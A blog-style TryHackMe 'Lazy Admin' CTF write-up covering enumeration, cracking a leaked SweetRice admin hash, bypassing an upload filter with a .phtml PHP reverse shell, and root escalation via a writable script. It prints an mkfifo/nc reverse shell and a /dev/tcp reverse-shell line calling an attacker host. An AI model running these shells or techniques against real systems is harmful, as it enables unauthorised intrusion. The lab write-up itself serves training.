---
layout: post
title: Lazy Admin
date:   2025-09-10 11:07
description: TryHackMe Lazy Admin CTF Write-Up
tags: tryhackme
comments: false
---
-TRYHACKME CTF WRITEUP-
<br>
<br>
<br>
![img]({{ '/assets/images/lazyadmin/lazyadmin.jpeg' | relative_url }}){: .center-image }
[Link To CTF](https://tryhackme.com/room/lazyadmin)
<br>
<br>

## We start off running an Nmap scan to enumerate the open ports on the target
{% highlight bash %}
$ nmap -sCV x.x.x.x
{% endhighlight bash %}

## We can see that ports 22 & 80 are open in the nmap scan below
![img]({{ '/assets/images/lazyadmin/1-lazyadmin.png' | relative_url }}){: .center-image }
<br>

## Navigating to the webpage shows us a basic apache webserver page
## Lets enumerated directories and subdirectories with [dirb](https://www.kali.org/tools/dirb/)
## The script below will scan against the common.txt directory wordlist
{% highlight bash %}
$ dirb http://x.x.x.x
{% endhighlight bash %}

## We can see in the screenshot below that there are a few directories of interest
![img]({{ '/assets/images/lazyadmin/2-lazyadmin.png' | relative_url }}){: .center-image }
<br>

## Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed yet
![img]({{ '/assets/images/lazyadmin/3-lazyadmin.png' | relative_url }}){: .center-image }


## "/content/as" page shows us that there is a login page
![img]({{ '/assets/images/lazyadmin/4-lazyadmin.png' | relative_url }}){: .center-image }


## Navigating to "/content/inc" we find a directory list and site map
## We show ~30 different files and directories here, but one caught my eye... 
{% highlight bash %}
mysql_backup/
{% endhighlight bash %}
![img]({{ '/assets/images/lazyadmin/5-lazyadmin.png' | relative_url }}){: .center-image }

![img]({{ '/assets/images/lazyadmin/6-lazyadmin.png' | relative_url }}){: .center-image }
<br>

## Lets download this file and inspect it ...
![img]({{ '/assets/images/lazyadmin/7-lazyadmin.png' | relative_url }}){: .center-image }

## Looking at this file we can see that it shows us an admin username and hashed password
![img]({{ '/assets/images/lazyadmin/8-lazyadmin.png' | relative_url }}){: .center-image }
{% highlight bash %}
admin user: manager
hash: 42f749ade7f9e195bf475f37a44cafcb 
{% highlight bash %}

## Lets try to crack this hash first with an online crack tool
## Using [hashes.com](https://hashes.com/en/decrypt/hash), We are able to crack the hash easily
![img]({{ '/assets/images/lazyadmin/9-lazyadmin.png' | relative_url }}){: .center-image }
<br>


## Let's try to Login with the new credentials at the login page
{% highlight bash %}
Account: manager
Password: [cracked hashed password]
{% highlight bash %}
![img]({{ '/assets/images/lazyadmin/10-lazyadmin.png' | relative_url }}){: .center-image }

## SUCCESS !
<br>

## Looking around this page for potential vulnerabilites,
## We can see there is the option to upload files on the "MEDIA CENTER" page
![img]({{ '/assets/images/lazyadmin/11-lazyadmin.png' | relative_url }}){: .center-image }


## Lets try and upload a known malicious file...
## I tried to upload the php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
## This however failed and did not upload successfully 
<br>

## We can determine that there is a filter in place preventing our upload
## Let's try and modify the request and see if we can bypass the filter
<br>

## Using [Burpsuite](https://portswigger.net/burp/communitydownload)
## Lets reload and capture the page in order to modify the request
## Let's try to change the request from of our payload from '.php' to '.phtml' and forward the request
![img]({{ '/assets/images/lazyadmin/12-lazyadmin.png' | relative_url }}){: .center-image }

We can see that this bypassed the filter and was succfully uploaded !


![img]({{ '/assets/images/lazyadmin/13-lazyadmin.png' | relative_url }}){: .center-image }

Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link on the page
We now get a successful shell on our machine connecting to the target machine


Lets move into the /home directory and capture the user flag



![img]({{ '/assets/images/lazyadmin/14-lazyadmin.png' | relative_url }}){: .center-image }

> Flag: THM[redacted]


_________________

We now captured the User Flag !!!

Lets try and escalate our privilege to get the root flag...



{% highlight bash %}
$ sudo -l 
{% endhighlight bash %}


Running the command above shows that itguy can run a perl script called 'backup.pl' as root
We can inspect and see that it executes a bash script at '/etc/copy.sh'
Inspecting this we see there is a  file which shows a script being run


![img]({{ '/assets/images/lazyadmin/15-lazyadmin.png' | relative_url }}){: .center-image }

{% highlight bash %}
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
{% endhighlight bash %}




Lets modify it to point to our IP and port of our listener 


{% highlight bash %}
$  echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh
{% endhighlight bash %}

*Remember we are already connected on the port we chose for the first shell connection
*So we will need to select a second listener and a different port from the first listener we set up


![img]({{ '/assets/images/lazyadmin/16-lazyadmin.png' | relative_url }}){: .center-image }

Lets run the command below to start the script



{% highlight bash %}
$ sudo /usr/bin/perl /home/itguy/backup.pl
{% endhighlight bash %}



We now get our reverse shell as root on our machine!!!
Lets cat out /root/root.txt to capture the ROOT FLAG



![img]({{ '/assets/images/lazyadmin/17-lazyadmin.png' | relative_url }}){: .center-image }

We have now captured the root flag and pwnd the machine !


# LESSONS LEARNED:

This machine was able to be exploited due to an easily accessible credential file found on an unfinished webserver
We were able to crack a weak password hash, bypass an upload filter, and compromise the system by gaining access as an authorized user
We were later able to abuse these privileges by modifying an accessible script with root access 

This attack could have been prevented by emplimenting stronger passwords 
As well as ensuring credential files are not easily accessible











